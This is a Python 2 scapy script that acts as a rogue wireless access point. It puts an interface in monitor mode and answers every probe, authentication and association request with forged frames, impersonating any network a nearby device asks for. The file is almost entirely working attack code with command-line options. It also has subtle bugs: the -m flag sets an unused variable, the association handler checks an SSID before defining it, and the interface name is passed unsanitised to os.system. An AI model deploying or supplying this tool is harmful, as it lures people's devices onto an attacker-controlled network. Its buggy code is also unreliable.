#!/usr/bin/python

import os
import sys
import time
import getopt
from scapy.all import *

iface = "wlan0"
ssid_filter = []
client_addr = None
mymac = "aa:bb:cc:aa:bb:cc"


# Extract Rates and ESRates from ELT header
def get_rates(packet):
    rates = "\x82\x84\x0b\x16"
    esrates = "\x0c\x12\x18"

    while Dot11Elt in packet:
        packet = packet[Dot11Elt]

        if packet.ID == 1:
            rates = packet.info

        elif packet.ID == 50:
	    esrates = packet.info

        packet = packet.payload

    return [rates, esrates]


def send_probe_response(packet):
    ssid = packet.info
    rates = get_rates(packet)
    channel = "\x07"

    if ssid_filter and ssid not in ssid_filter:
	return

    print "\n\nSending probe response for " + ssid + \
          " to " + str(packet[Dot11].addr2) + "\n"

    # addr1 = destination, addr2 = source,
    # addr3 = access point
    # dsset sets channel
    cap="ESS+privacy+short-preamble+short-slot"

    resp = RadioTap() / \
           Dot11(addr1=packet[Dot11].addr2,
                 addr2=mymac, addr3=mymac) / \
           Dot11ProbeResp(timestamp=time.time(),
                          cap=cap) / \
           Dot11Elt(ID='SSID', info=ssid) / \
           Dot11Elt(ID="Rates", info=rates[0]) / \
           Dot11Elt(ID="DSset",info=channel) / \
           Dot11Elt(ID="ESRates", info=rates[1])

    sendp(resp, iface=iface)


def send_auth_response(packet):
    # Dont answer our own auth packets
    if packet[Dot11].addr2 != mymac:
       print "Sending authentication to " + packet[Dot11].addr2

       res = RadioTap() / \
             Dot11(addr1=packet[Dot11].addr2,
                   addr2=mymac, addr3=mymac) / \
             Dot11Auth(algo=0, seqnum=2, status=0)

       sendp(res, iface=iface)


def send_association_response(packet):
    if ssid_filter and ssid not in ssid_filter:
	return

    ssid = packet.info
    rates = get_rates(packet)
    print "Sending Association response for " + ssid + \
          " to " + packet[Dot11].addr2

    res = RadioTap() / \
          Dot11(addr1=packet[Dot11].addr2,
                addr2=mymac, addr3=mymac) / \
          Dot11AssoResp(AID=2) / \
        Dot11Elt(ID="Rates", info=rates[0]) / \
	Dot11Elt(ID="ESRates", info=rates[1])

    sendp(res, iface=iface)


# This function is called for every captured packet
def handle_packet(packet):
    sys.stdout.write(".")
    sys.stdout.flush()

    if client_addr and packet.addr2 != client_addr:
        return

    # Got probe request?
    if packet.haslayer(Dot11ProbeReq):
        send_probe_response(packet)

    # Got authenticaton request
    elif packet.haslayer(Dot11Auth):
        send_auth_response(packet)

    # Got association request
    elif packet.haslayer(Dot11AssoReq):
        send_association_response(packet)


def usage():
    print sys.argv[0]
    print """
    -a <addr> (optional)
    -i <interface> (optional)
    -m <source_mac> (optional)
    -s <ssid1,ssid2> (optional)
    """
    sys.exit(1)


# Parsing parameter
if len(sys.argv) == 2 and sys.argv[1] == "--help":
    usage()

try:
    cmd_opts = "a:i:m:s:"
    opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
except getopt.GetoptError:
    usage()

for opt in opts:
    if opt[0] == "-a":
        client_addr = opt[1]
    elif opt[0] == "-i":
        iface = opt[1]
    elif opt[0] == "-m":
	my_mac = opt[1]
    elif opt[0] == "-s":
        ssid_filter = opt[1].split(",")
    else:
        usage()

os.system("iwconfig " + iface + " mode monitor")

# Start sniffing
print "Sniffing on interface " + iface
sniff(iface=iface, prn=handle_packet)
